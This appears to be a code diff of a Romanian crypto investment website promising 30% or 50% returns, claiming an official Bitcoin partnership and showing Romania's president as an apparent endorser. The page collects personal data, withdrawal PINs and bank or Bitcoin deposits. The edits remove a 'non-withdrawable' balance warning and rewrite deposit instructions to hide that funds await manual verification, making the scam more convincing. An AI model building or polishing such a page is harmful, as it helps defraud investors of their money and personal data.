@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="apple-touch-icon" href="https://z-cdn-media.chatglm.cn/files/37046b57-4005-4f0c-9557-898357e28284.png">
-    <link rel="icon" type="image/png" href="https://z-cdn-media.chatglm.cn/files/37046b57-4005-4f0c-9557-898357e28284.png">
+    <link rel="apple-touch-icon" href="https://www.mcafeetaft.com/wp-content/uploads/2024/01/240118_JR-article_Moore_Bitcoin-ETF_web.jpg">
+    <link rel="icon" type="image/png" href="https://www.mcafeetaft.com/wp-content/uploads/2024/01/240118_JR-article_Moore_Bitcoin-ETF_web.jpg">
     <meta name="description" content="TRONUL INVESTIȚIILOR - Generăm viitorul tău financiar din 2019. Parteneriat cu Bitcoin pentru randamente consistente.">
     <meta name="theme-color" content="#0a1f3d">
     <meta name="mobile-web-app-capable" content="yes">
@@ -82,7 +82,7 @@
         /* ===== NAV ===== */
         nav { display: flex; justify-content: space-between; align-items: center; padding: 14px 5%; background: var(--nav-bg); backdrop-filter: blur(12px); position: fixed; top: 0; width: 100%; z-index: 1000; border-bottom: 1px solid var(--border-color); box-shadow: var(--shadow-sm); transition: background 0.3s; }
         .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
-        .logo-icon { width: 42px; height: 42px; border-radius: 50%; background: linear-gradient(135deg, var(--gold-400), var(--gold-600)); display: flex; align-items: center; justify-content: center; color: var(--navy-900); font-size: 20px; font-weight: 900; box-shadow: 0 4px 12px rgba(201,162,39,0.4); }
+        .logo-icon { width: 42px; height: 42px; border-radius: 50%; background: linear-gradient(135deg, var(--gold-400), var(--gold-600)); display: flex; align-items: center; justify-content: center; color: var(--navy-900); font-size: 20px; font-weight: 900; box-shadow: 0 4px 12px rgba(201,162,39,0.4); flex-shrink: 0; }
         .logo-text { font-size: 15px; font-weight: 800; color: var(--nav-text); letter-spacing: 0.5px; line-height: 1.2; }
         .logo-text span { display: block; font-size: 9px; font-weight: 500; color: var(--gold-500); letter-spacing: 1.5px; }
         .nav-links { display: flex; gap: 28px; align-items: center; }
@@ -111,8 +111,25 @@
         .contact-option:hover { background: var(--card-bg); }
         .contact-option .co-label { font-size: 13px; font-weight: 500; }
         .contact-option .co-icon { color: var(--gold-500); font-size: 13px; }
-        @media(max-width:900px) { .nav-links { display: none; } .nav-right .tron-btn-outline:not(.contact-trigger) { display: none; } }
-        @media(max-width:600px) { .nav-right .tron-btn-primary { padding: 7px 14px; font-size: 12px; } .contact-trigger { padding: 7px 12px !important; font-size: 12px !important; } }
+        
+        /* ===== RESPONSIVE NAV FIXES ===== */
+        @media(max-width:900px) { 
+            .nav-links { display: none; } 
+            .nav-right { gap: 6px; } 
+            .nav-right .tron-btn { padding: 8px 12px; font-size: 12px; } 
+        }
+        @media(max-width:600px) { 
+            .logo-text { display: none; }
+            .nav-right .tron-btn { padding: 8px 12px; font-size: 12px; gap: 6px; } 
+            .contact-trigger span { display: none; } 
+            .hero h1 { font-size: 32px; }
+            .hero p { font-size: 15px; }
+            .hero-actions { flex-direction: column; width: 100%; gap: 10px; }
+            .hero-btn-gold, .hero-btn-outline { width: 100%; justify-content: center; }
+        }
+        @media(max-width:380px) { 
+            .nav-right .tron-btn span { display: none; } 
+        }
 
         /* ===== HERO ===== */
         .hero { min-height: 100vh; display: flex; align-items: center; padding: 110px 5% 60px; position: relative; overflow: hidden; }
@@ -327,17 +344,23 @@
         .footer-col a:hover { color: var(--gold-400); opacity: 1; }
         .footer-bottom { border-top: 1px solid rgba(255,255,255,0.1); padding-top: 22px; text-align: center; color: var(--footer-text); opacity: 0.5; font-size: 12px; }
 
-        /* MODALS */
+        /* MODALS - FULL SCREEN ON MOBILE */
         .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(6,18,39,0.75); backdrop-filter: blur(6px); display: none; justify-content: center; align-items: flex-start; z-index: 9999; padding: 30px 16px; overflow-y: auto; }
         .modal.open { display: flex; animation: fadeIn 0.2s ease; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .modal-content { background: var(--bg-main); width: 100%; max-width: 450px; padding: 30px; border-radius: 14px; margin: auto; border: 1px solid var(--border-color); box-shadow: var(--shadow-lg); animation: slideUp 0.3s ease; }
+        .modal-content { background: var(--bg-main); width: 100%; max-width: 450px; padding: 30px; border-radius: 14px; margin: auto; border: 1px solid var(--border-color); box-shadow: var(--shadow-lg); animation: slideUp 0.3s ease; position: relative; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         .modal-close { background: rgba(10,31,61,0.06); border: none; color: var(--text-gray); width: 32px; height: 32px; border-radius: 50%; cursor: pointer; font-size: 14px; float: right; transition: 0.2s; display: flex; align-items: center; justify-content: center; }
         .modal-close:hover { background: rgba(10,31,61,0.1); color: var(--text-primary); }
         body.dark-mode .modal-close { background: rgba(255,255,255,0.06); }
         .modal input, .modal select { width: 100%; padding: 12px 14px; margin-bottom: 12px; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 8px; color: var(--text-primary); font-size: 14px; outline: none; transition: border 0.2s, box-shadow 0.2s; font-family: inherit; }
         .modal input:focus, .modal select:focus { border-color: var(--gold-500); box-shadow: 0 0 0 3px rgba(201,162,39,0.1); }
+
+        @media (max-width: 600px) {
+            .modal { padding: 0; align-items: stretch; }
+            .modal-content { max-width: 100%; width: 100%; min-height: 100vh; border-radius: 0; padding-top: 60px; padding-bottom: 30px; overflow-y: auto; }
+            .modal-close { position: absolute; top: 15px; right: 15px; width: 40px; height: 40px; font-size: 16px; z-index: 10; float: none; background: rgba(10,31,61,0.06); }
+        }
 
         /* REGISTRATION STEPS */
         .reg-step { display: none; }
@@ -417,7 +440,6 @@
         .dash-balance-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
         .dash-balance-amount { font-size: 32px; font-weight: 800; color: #fff; letter-spacing: -1px; line-height: 1.1; }
         .dash-balance-pending { font-size: 11px; color: var(--gold-400); background: rgba(201,162,39,0.15); padding: 4px 10px; border-radius: 50px; font-weight: 700; border: 1px solid rgba(201,162,39,0.3); display: none; align-items: center; gap: 5px; }
-        .dash-balance-unwithdrawable { font-size: 12px; color: #f87171; font-weight: 700; margin-top: 6px; display: none; align-items: center; gap: 5px; }
         .dash-eye-toggle { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); color: rgba(255,255,255,0.85); width: 30px; height: 30px; border-radius: 50%; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; transition: 0.2s; }
         .dash-eye-toggle:hover { background: rgba(255,255,255,0.18); }
         .dash-chart-wrap { margin-top: 14px; position: relative; z-index: 1; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 10px 8px 8px; }
@@ -628,7 +650,7 @@
         <div class="theme-toggle" onclick="toggleTheme()"><span id="themeIcon"><i class="fa-solid fa-moon"></i></span></div>
         <div class="contact-dropdown">
             <button class="tron-btn tron-btn-outline contact-trigger" onclick="toggleContactDropdown()">
-                <i class="fas fa-phone"></i> Contact <i class="fas fa-chevron-down" style="font-size:10px;"></i>
+                <i class="fas fa-phone"></i> <span>Contact</span> <i class="fas fa-chevron-down" style="font-size:10px;"></i>
             </button>
             <div class="contact-dropdown-content" id="contactDropdown">
                 <div class="contact-dropdown-header">Contactează TRONUL</div>
@@ -640,8 +662,8 @@
                 <a class="contact-option" onclick="contactTron('Gala Investitorului')"><span class="co-label">Gala Investitorului</span><i class="fas fa-envelope co-icon"></i></a>
             </div>
         </div>
-        <button class="tron-btn tron-btn-outline" onclick="toggleModal('loginMod')"><i class="fas fa-sign-in-alt"></i> Conectare</button>
-        <button class="tron-btn tron-btn-primary" onclick="toggleModal('signupChoiceMod')"><i class="fas fa-plus"></i> Cont Nou</button>
+        <button class="tron-btn tron-btn-outline" onclick="toggleModal('loginMod')"><i class="fas fa-sign-in-alt"></i> <span>Conectare</span></button>
+        <button class="tron-btn tron-btn-primary" onclick="toggleModal('signupChoiceMod')"><i class="fas fa-plus"></i> <span>Cont Nou</span></button>
     </div>
 </nav>
 
@@ -664,8 +686,8 @@
     <!-- HERO -->
     <section class="hero">
         <div class="hero-bg">
-            <div class="hero-bg-img active" id="heroImg1" style="background-image: url('https://z-cdn-media.chatglm.cn/files/a78091c4-c947-400d-97c1-f3c5cd474325.png');"></div>
-            <div class="hero-bg-img" id="heroImg2" style="background-image: url('https://z-cdn-media.chatglm.cn/files/d35b8cac-1f9b-4c63-be50-cad76dea3402.png');"></div>
+            <div class="hero-bg-img active" id="heroImg1" style="background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLCWQ1U5sJpJIrEIH0GfrIY6T5tmDEjxEHruTYN8_p8R_e3FSxBYlTqWI7&s=10');"></div>
+            <div class="hero-bg-img" id="heroImg2" style="background-image: url('https://www.romaniaexperience.com/wp-content/uploads/2020/05/best-cities-to-visit-in-Romania.jpg');"></div>
             <div class="hero-bg-overlay"></div>
             <div class="hero-bg-pattern"></div>
         </div>
@@ -675,8 +697,8 @@
                 <h1>TRONUL INVESTIȚIILOR<br><span class="gold">Generăm Viitorul Tău Financiar</span> Din 2019</h1>
                 <p>Grupul nostru operează din 2019 în parteneriat cu Bitcoin, tranzacționând capital pe piețele financiare străine. Generăm profit consistent și returnăm randamente agresive investitorilor noștri — 30% sau 50% pe capitalul investit.</p>
                 <div class="hero-actions">
-                    <button class="hero-btn-gold" onclick="toggleModal('signupChoiceMod')"><i class="fas fa-rocket"></i> Începe să Investești</button>
-                    <button class="hero-btn-outline" onclick="scrollToSection('plans')"><i class="fas fa-chart-line"></i> Vezi Planurile</button>
+                    <button class="hero-btn-gold" onclick="toggleModal('signupChoiceMod')"><i class="fas fa-rocket"></i> Cont Nou</button>
+                    <button class="hero-btn-outline" onclick="toggleModal('loginMod')"><i class="fas fa-sign-in-alt"></i> Conectare</button>
                 </div>
                 <div class="hero-stats">
                     <div class="hero-stat">
@@ -777,7 +799,7 @@
     <section class="btc-partner-section">
         <div class="btc-partner-grid">
             <div>
-                <img src="https://z-cdn-media.chatglm.cn/files/37046b57-4005-4f0c-9557-898357e28284.png" class="btc-partner-img" alt="Bitcoin Partnership">
+                <img src="https://www.mcafeetaft.com/wp-content/uploads/2024/01/240118_JR-article_Moore_Bitcoin-ETF_web.jpg" class="btc-partner-img" alt="Bitcoin Partnership">
             </div>
             <div class="btc-partner-content">
                 <h2>Parteneriat Oficial cu <span class="gold">Bitcoin</span></h2>
@@ -845,7 +867,7 @@
         <div class="section-container">
             <div class="president-grid">
                 <div class="president-img-wrap">
-                    <img src="https://z-cdn-media.chatglm.cn/files/a5218d76-f8a0-4e45-a64b-46ab50686fe7.png" class="president-img" alt="Președintele Nicușor Dan">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5R_GeJWWvA4iD8kfsTck6C_SyoNDu2xU_wNUhAc_P33GzXeT0FCoexCgx&s=10" class="president-img" alt="Președintele Nicușor Dan">
                     <div class="president-img-badge">
                         <div class="name">Nicușor Dan</div>
                         <div class="role">Președintele României</div>
@@ -884,7 +906,7 @@
     <section class="section economy-section">
         <div class="section-container">
             <h2 class="section-title">Economia <span class="gold">României & Europa</span></h2>
-            <p class="section-sub">România este un hub economic dinamic în Europa de Est, cu creștere constantă și oportunități de investiții în多种 sectoare.</p>
+            <p class="section-sub">România este un hub economic dinamic în Europa de Est, cu creștere constantă și oportunități de investiții în diverse sectoare.</p>
             <div class="economy-grid">
                 <div class="economy-card">
                     <img class="economy-card-img" src="https://images.unsplash.com/photo-1581262177000-8139a463e531?w=400" alt="Bucharest">
@@ -1019,7 +1041,7 @@
             <h2 class="section-title">Întrebări <span class="gold">Frecvente</span></h2>
             <div style="margin-top:30px;">
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Ce este TRONUL INVESTIȚIILOR?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">TRONUL INVESTIȚIILOR este un grup de investiții care operează din 2019 în parteneriat cu Bitcoin. Tranzacționăm capitalul investitorilor pe piețele financiare străine și returnăm profit consistent — 30% sau 50% pe capitalul investit.</div></div>
-                <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum deschid un cont?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Apasă pe "Cont Nou", completează datele personale (nume, email, telefon, adresă, dată naștere), alege genul, creează o parolă și un PIN de retragere din 4 cifre. Verifici emailul cu codul OTP și contul este activ.</div></div>
+                <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum deschid un cont?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Apasă pe "Cont Nou", completează datele personale (nume, email, telefon, adresă, dată naștere), alege genul, creează o parolă și un PIN de retragere din 4 cifre. Verifică emailul cu codul OTP și contul este activ.</div></div>
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Care sunt planurile de investiții?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Planul 1 (1.000 - 4.999 LEI): 30% profit pe capital. Planul 2 (5.000+ LEI): 50% profit în 3 luni. Ambele planuri includ participarea la Gala Investitorului din 27 Decembrie.</div></div>
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum depun fonduri?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Poți depune prin Transfer Bancar (cu IBAN, SWIFT, numele băncii și beneficiar) sau prin Bitcoin (BTC). La depozitul Bitcoin, alegi un tier (1.000-5.000, 5.000-15.000, 20.000-50.000, 100.000-1.000.000 LEI), introdu suma exactă, se convertește în BTC și primești o adresă BTC + QR code.</div></div>
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum funcționează parteneriatul cu Bitcoin?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Odată ce fondurile sunt depuse, compania le transferă partenerului Bitcoin care le tranzacționează pe piețele financiare străine. Profitul generat este returnat investitorilor sub formă de 30% sau 50% pe capitalul investit.</div></div>
@@ -1140,7 +1162,6 @@
                     <button class="dash-eye-toggle" onclick="toggleBalanceVisibility()" id="eyeBtn"><i class="fas fa-eye" id="eyeIcon"></i></button>
                     <span class="dash-balance-pending" id="dashBalancePending"><i class="fas fa-clock"></i> În așteptare</span>
                 </div>
-                <div class="dash-balance-unwithdrawable" id="dashBalanceUnwithdrawable"><i class="fas fa-lock"></i> Ne-retrasibil</div>
             </div>
 
             <div class="dash-chart-wrap">
@@ -1485,6 +1506,7 @@
 <!-- WELCOME MODAL -->
 <div class="modal" id="welcomeMod">
     <div class="modal-content" style="text-align:center;max-width:420px;">
+        <button class="modal-close" onclick="toggleModal('welcomeMod')"><i class="fas fa-times"></i></button>
         <div id="welcomeSpinner" style="display:flex;flex-direction:column;align-items:center;">
             <div class="spin-ring" style="width:50px;height:50px;margin-bottom:16px;"></div>
             <p style="color:var(--gold-500);font-size:13px;font-weight:600;letter-spacing:1px;" id="verifyText">VERIFICARE CONT...</p>
@@ -1669,8 +1691,8 @@
             <ul>
                 <li><strong>Transfer Bancar:</strong> Primești IBAN, SWIFT, numele băncii și beneficiarul. Efectuezi transferul și confirmi plata.</li>
                 <li><strong>Bitcoin (BTC):</strong> Alegi un tier (1K-5K, 5K-15K, 20K-50K, 100K-1M LEI), introdu suma exactă, se convertește în BTC, primești adresă + QR code.</li>
-                <li>După confirmarea "Am Plătit", tranzacția apare galbenă (pending) în istoric</li>
-                <li>Depozitul se reflectă după verificare manuală</li>
+                <li>După confirmarea "Am Plătit", depozitul este înregistrat în contul tău</li>
+                <li>Poți urmări statusul tranzacției în secțiunea "Activitate"</li>
             </ul>
             <div style="display:flex;gap:10px;">
                 <button class="tron-btn tron-btn-outline" style="flex:1;padding:12px;color:var(--text-primary);border-color:var(--border-color);" onclick="nextGuideStep(2)"><i class="fas fa-arrow-left"></i> Înapoi</button>
@@ -2143,6 +2165,18 @@
         tradePrices.BET += (Math.random() - 0.48) * 35;
         tradePrices.DAX += (Math.random() - 0.48) * 45;
         tradePrices.BTC = Math.max(90000, Math.min(105000, tradePrices.BTC));
+
+        // Push new price to history for live chart animation
+        priceHistory.push(tradePrices.BTC);
+        if (priceHistory.length > CHART_MAX_HISTORY) {
+            priceHistory.shift();
+            if (chartViewOffset > 0) {
+                chartViewOffset = Math.min(priceHistory.length - CHART_VIEW_SIZE, chartViewOffset + 1);
+            }
+        }
+
+        if (!isAnimating) drawZigzagChart();
+
         const btcLei = tradePrices.BTC * USD_TO_LEI_RATE;
         const ethLei = tradePrices.ETH * USD_TO_LEI_RATE;
         const updates = [
@@ -2434,18 +2468,18 @@
         if (transferBalEl) transferBalEl.innerText = `Disponibil: ${formatted}`;
     }
 
-    function updateUnwithdrawableStatus(transactions) {
+    // ===== PENDING STATUS (NO LOCK SIGN) =====
+    function updatePendingStatus(transactions) {
         const pendingEl = document.getElementById('dashBalancePending');
-        const unwithdrawableEl = document.getElementById('dashBalanceUnwithdrawable');
-        if (!pendingEl || !unwithdrawableEl) return;
+        if (!pendingEl) return;
         let hasPendingDeposit = false;
         if (transactions) {
             Object.values(transactions).forEach(tx => {
                 if (tx.status === 'PENDING' && (tx.type === 'DEPOSIT')) hasPendingDeposit = true;
             });
         }
-        if (hasPendingDeposit) { pendingEl.style.display = 'inline-flex'; unwithdrawableEl.style.display = 'flex'; }
-        else { pendingEl.style.display = 'none'; unwithdrawableEl.style.display = 'none'; }
+        if (hasPendingDeposit) { pendingEl.style.display = 'inline-flex'; }
+        else { pendingEl.style.display = 'none'; }
     }
 
     // ===== GUIDE MODAL =====
@@ -2778,11 +2812,11 @@
                 if (container) container.innerHTML = `<div class="invest-empty"><i class="fas fa-chart-line"></i><p>Nicio investiție încă. Fă un depozit pentru a începe!</p></div>`;
                 if (watchlist) watchlist.innerHTML = `<div class="invest-empty"><i class="fas fa-inbox"></i><p>Nicio tranzacție încă.</p></div>`;
                 if (recent) recent.innerHTML = `<div class="invest-empty"><i class="fas fa-inbox"></i><p>Nicio tranzacție încă.</p></div>`;
-                updateUnwithdrawableStatus(null);
+                updatePendingStatus(null);
                 return;
             }
             const txs = Object.entries(snap.val()).reverse().map(([k,v]) => ({...v, key:k}));
-            updateUnwithdrawableStatus(snap.val());
+            updatePendingStatus(snap.val());
             const investTxs = txs.filter(t => t.type === 'DEPOSIT' || t.status === 'SUCCESS');
             if (investTxs.length > 0 && container) {
                 container.innerHTML = investTxs.slice(0, 5).map(tx => {
@@ -2879,7 +2913,7 @@
                 }
                 updateNotifBadge(); renderNotifs();
                 updateInvestmentList();
-                updateUnwithdrawableStatus(txData);
+                updatePendingStatus(txData);
             });
             onValue(ref(db, 'messages/' + user.uid), (msnap) => {
                 if (msnap.exists()) {
